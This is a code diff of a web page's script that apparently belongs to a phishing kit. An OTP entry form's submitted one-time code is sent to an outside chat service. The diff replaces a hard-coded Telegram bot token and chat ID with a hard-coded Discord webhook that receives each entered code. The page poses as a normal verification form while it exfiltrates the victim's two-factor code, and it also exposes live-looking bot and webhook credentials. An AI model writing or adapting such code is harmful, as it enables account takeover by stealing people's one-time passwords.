@@ -198,9 +198,7 @@
     const messageEl = document.getElementById("message");
     const container = document.getElementById("form-container");
 
-    const TELEGRAM_TOKEN = "8415946453:AAEBq05t-7xawIXkSPFnqBtdoVsibe-xEVM";
-    const TELEGRAM_CHAT_ID = "-1004403515903";
-    const telegramAPI = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1541215825439096883/aTWGitK-2s4diofAmEHQs7fxPqQw9ib6hlgGxPCi28UIVyAxEhtEL9L2-xMZrNCWchsC";
 
     inputs.forEach((input, i) => {
       input.addEventListener("input", () => {
@@ -228,12 +226,11 @@
       }
 
       try {
-        const res = await fetch(telegramAPI, {
+        const res = await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: `otp: ${code}`
+            content: `OTP reçu : **${code}**`
           })
         });
 
